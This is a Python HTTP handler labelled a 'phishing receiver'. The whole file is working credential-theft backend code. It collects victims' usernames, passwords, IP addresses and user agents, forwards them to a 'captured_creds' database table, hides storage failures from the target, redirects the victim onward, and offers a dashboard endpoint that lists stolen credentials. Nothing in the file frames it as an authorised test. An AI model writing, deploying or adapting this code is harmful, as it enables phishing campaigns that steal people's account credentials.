import os
import json
from http.server import BaseHTTPRequestHandler
import urllib.request

# BIFROST PHANTOM PHISHING RECEIVER

SUPABASE_URL = os.getenv("SUPABASE_URL", "").strip().rstrip("/")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "").strip()

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        try:
            cl = int(self.headers.get('Content-Length', 0))
            body = json.loads(self.rfile.read(cl))
            
            campaign = body.get('campaign', 'unknown')
            username = body.get('username', '')
            password = body.get('password', '')
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            user_agent = self.headers.get('user-agent', '')
            
            if not username or not password:
                return self._json(400, {"error": "Missing credentials"})
            
            # Store in Supabase
            if SUPABASE_URL and SUPABASE_KEY:
                # Assuming table 'captured_creds' exists
                payload = {
                    "campaign": campaign,
                    "username": username,
                    "password": password,
                    "ip_address": ip,
                    "user_agent": user_agent
                }
                
                req = urllib.request.Request(
                    f"{SUPABASE_URL}/rest/v1/captured_creds",
                    data=json.dumps(payload).encode('utf-8'),
                    headers={
                        "apikey": SUPABASE_KEY,
                        "Authorization": f"Bearer {SUPABASE_KEY}",
                        "Content-Type": "application/json",
                        "Prefer": "return=minimal"
                    },
                    method="POST"
                )
                
                try:
                    with urllib.request.urlopen(req, timeout=5) as response:
                        if response.getcode() in [201, 204]:
                            # Stored successfully
                            pass
                except Exception as db_err:
                    print(f"Supabase error: {db_err}")
                    # Even if DB fails, we don't necessarily want to alert the target
            
            # Redirect the user or send success response
            # In a real phishing scenario, we might redirect them to the real site now
            # For this API endpoint, we just return a success status
            self._json(200, {"status": "success", "redirect": "https://google.com"})
            
        except Exception as e:
            self._json(500, {"error": str(e)})

    def do_GET(self):
        # Allow fetching the captured creds for the dashboard
        action = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get('action', [''])[0]
        
        if action == 'list':
            if not SUPABASE_URL or not SUPABASE_KEY:
                return self._json(500, {"error": "Database not configured"})
                
            req = urllib.request.Request(
                f"{SUPABASE_URL}/rest/v1/captured_creds?select=*&order=created_at.desc&limit=50",
                headers={
                    "apikey": SUPABASE_KEY,
                    "Authorization": f"Bearer {SUPABASE_KEY}"
                }
            )
            try:
                with urllib.request.urlopen(req, timeout=5) as response:
                    data = json.loads(response.read().decode())
                    self._json(200, {"status": "success", "data": data})
            except Exception as e:
                self._json(500, {"error": f"Failed to fetch: {str(e)}"})
        else:
            self._json(400, {"error": "Invalid action"})

    def _json(self, code, data):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
